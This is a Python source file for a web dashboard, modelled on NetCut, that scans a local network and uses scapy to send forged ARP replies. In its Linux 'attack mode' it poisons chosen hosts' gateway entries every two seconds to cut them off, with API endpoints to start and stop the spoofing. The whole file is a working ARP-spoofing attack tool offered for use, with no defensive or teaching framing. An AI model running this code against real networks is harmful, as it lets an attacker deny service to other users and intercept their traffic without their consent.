#!/usr/bin/env python3
"""
NetCut Web Dashboard - Cross Platform Edition
Modes:
- Windows  : DEV MODE (UI + API mock)
- Linux    : ATTACK MODE (Real ARP Spoofing)
"""

import asyncio
import uvicorn
import subprocess
import threading
import time
import json
from typing import List, Dict
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
import netifaces
from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr, conf
import ipaddress
import os
import platform

# =========================
# ENV DETECTION
# =========================
IS_WINDOWS = os.name == "nt"
IS_LINUX = platform.system().lower() == "linux"

MODE = "DEV" if IS_WINDOWS else "ATTACK"

print(f"[+] Running in {MODE} MODE")

# =========================
# PATH CONFIG
# =========================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

app = FastAPI(title="NetCut Web Dashboard")

app.mount("/static", StaticFiles(directory=os.path.join(BASE_DIR, "static")), name="static")
templates = Jinja2Templates(directory=os.path.join(BASE_DIR, "templates"))

conf.verb = 0  # Disable scapy verbose


# =========================
# ARP ENGINE
# =========================
class ARPAttack:
    def __init__(self, interface: str = None):

        # ---------- DEV MODE (WINDOWS) ----------
        if MODE == "DEV":
            self.interface = "windows-mock"
            self.gateway_ip = "192.168.1.1"
            self.gateway_mac = "AA:BB:CC:DD:EE:FF"
            self.my_mac = "11:22:33:44:55:66"
            self.my_ip = "127.0.0.1"

        # ---------- ATTACK MODE (LINUX) ----------
        else:
            self.interface = interface or self.get_default_interface()
            self.gateway_ip = self.get_gateway_ip()
            self.gateway_mac = self.get_gateway_mac()
            self.my_mac = get_if_hwaddr(self.interface)
            self.my_ip = netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']

        self.targets: Dict[str, str] = {}  # ip: mac
        self.active_spoofs: set = set()
        self.running = False
        self.scan_results = []

    # =========================
    # LINUX NETWORK FUNCTIONS
    # =========================
    def get_default_interface(self) -> str:
        result = subprocess.check_output(['ip', 'route', 'show', 'default']).decode()
        return result.split('dev ')[1].split(' ')[0]

    def get_gateway_ip(self) -> str:
        result = subprocess.check_output(['ip', 'route', 'show', 'default']).decode()
        return result.split('via ')[1].split(' ')[0]

    def get_gateway_mac(self) -> str:
        arp_request = ARP(pdst=self.gateway_ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        answered = srp(broadcast/arp_request, timeout=2, verbose=False, iface=self.interface)[0]
        return answered[0][1].hwsrc

    # =========================
    # NETWORK SCAN
    # =========================
    async def scan_network(self, ip_range: str = None) -> List[Dict]:

        # DEV MODE (MOCK DATA)
        if MODE == "DEV":
            self.scan_results = [
                {"ip": "192.168.1.2", "mac": "00:11:22:33:44:01", "status": "OK", "active": False},
                {"ip": "192.168.1.3", "mac": "00:11:22:33:44:02", "status": "OK", "active": False},
                {"ip": "192.168.1.4", "mac": "00:11:22:33:44:03", "status": "OK", "active": False},
            ]
            self.targets = {h["ip"]: h["mac"] for h in self.scan_results}
            return self.scan_results

        # ATTACK MODE (REAL SCAN)
        if not ip_range:
            network = ipaddress.IPv4Network(f"{self.gateway_ip}/24", strict=False)
            ip_range = str(network)

        arp = ARP(pdst=ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        result = srp(ether/arp, timeout=3, verbose=False, iface=self.interface)[0]

        self.targets.clear()
        self.scan_results.clear()

        for sent, received in result:
            self.targets[received.psrc] = received.hwsrc
            host = {
                "ip": received.psrc,
                "mac": received.hwsrc,
                "status": "OK",
                "active": False
            }
            self.scan_results.append(host)

        self.scan_results.sort(key=lambda x: x['ip'])
        return self.scan_results

    # =========================
    # ARP SPOOF
    # =========================
    def arp_spoof(self, target_ip: str, spoof: bool = True):

        if MODE == "DEV":
            return True  # no-op in dev

        target_mac = self.targets.get(target_ip)
        if not target_mac:
            return False

        if spoof:
            arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip)
        else:
            arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                               psrc=self.gateway_ip, hwsrc=self.gateway_mac)

        sendp(Ether(dst=target_mac)/arp_response, verbose=False, iface=self.interface)
        return True

    def spoof_loop(self, target_ip: str):
        while self.running and target_ip in self.active_spoofs:
            self.arp_spoof(target_ip, spoof=True)
            time.sleep(2)

    def start_spoofing(self, target_ips: List[str]):
        self.active_spoofs.update(target_ips)
        for ip in target_ips:
            if ip in self.targets:
                idx = [h['ip'] for h in self.scan_results].index(ip)
                self.scan_results[idx]['active'] = True
                self.scan_results[idx]['status'] = "CUT"
                if MODE == "ATTACK":
                    thread = threading.Thread(target=self.spoof_loop, args=(ip,), daemon=True)
                    thread.start()

    def stop_spoofing(self, target_ips: List[str]):
        for target_ip in target_ips:
            if target_ip in self.active_spoofs:
                self.arp_spoof(target_ip, spoof=False)
                self.active_spoofs.discard(target_ip)
                if target_ip in self.targets:
                    idx = [h['ip'] for h in self.scan_results].index(target_ip)
                    self.scan_results[idx]['active'] = False
                    self.scan_results[idx]['status'] = "OK"

    def restore_all(self):
        self.stop_spoofing(list(self.active_spoofs))
        self.running = False


# =========================
# GLOBAL STATE
# =========================
attack = ARPAttack()

manager = {
    "mode": MODE,
    "status": "idle",
    "targets": [],
    "active": [],
    "interface": attack.interface,
    "gateway": f"{attack.gateway_ip} ({attack.gateway_mac})",
    "attacker": f"{attack.my_ip} ({attack.my_mac})"
}

# =========================
# WS MANAGER
# =========================
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except:
                self.disconnect(connection)

manager_ws = ConnectionManager()

# =========================
# ROUTES
# =========================
@app.get("/", response_class=HTMLResponse)
async def dashboard():
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    html_path = os.path.join(BASE_DIR, "templates", "index.html")

    with open(html_path, "r", encoding="utf-8") as f:
        return HTMLResponse(content=f.read())

@app.get("/api/scan")
async def scan(ip_range: str = None):
    global manager
    manager["status"] = "scanning"
    await manager_ws.broadcast({"type": "status", "data": manager})

    hosts = await attack.scan_network(ip_range)
    manager["targets"] = attack.scan_results
    manager["status"] = "ready"

    await manager_ws.broadcast({
        "type": "scan_complete",
        "data": {"hosts": hosts, "count": len(hosts)}
    })

    return {"hosts": hosts, "count": len(hosts)}

@app.post("/api/spoof")
async def start_spoof(targets: List[str]):
    global manager
    manager["status"] = "spoofing"
    attack.running = True
    attack.start_spoofing(targets)
    manager["active"] = list(attack.active_spoofs)

    await manager_ws.broadcast({
        "type": "spoof_start",
        "data": {"targets": targets}
    })

    return {"status": "spoofing", "targets": targets}

@app.post("/api/stop")
async def stop_spoof(targets: List[str] = None):
    global manager
    if targets is None:
        attack.restore_all()
        manager["status"] = "idle"
        manager["active"] = []
    else:
        attack.stop_spoofing(targets)
        manager["active"] = list(attack.active_spoofs)
        if not manager["active"]:
            manager["status"] = "idle"

    await manager_ws.broadcast({
        "type": "spoof_stop",
        "data": {"targets": targets or "ALL"}
    })

    return {"status": "stopped"}

@app.get("/api/status")
async def status():
    return manager

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager_ws.connect(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager_ws.disconnect(websocket)

# =========================
# MAIN
# =========================
if __name__ == "__main__":
    print(f"[+] Interface : {attack.interface}")
    print(f"[+] Gateway   : {attack.gateway_ip}")
    print(f"[+] Attacker  : {attack.my_ip}")
    print(f"[+] Mode      : {MODE}")

    uvicorn.run(app, host="0.0.0.0", port=8000)
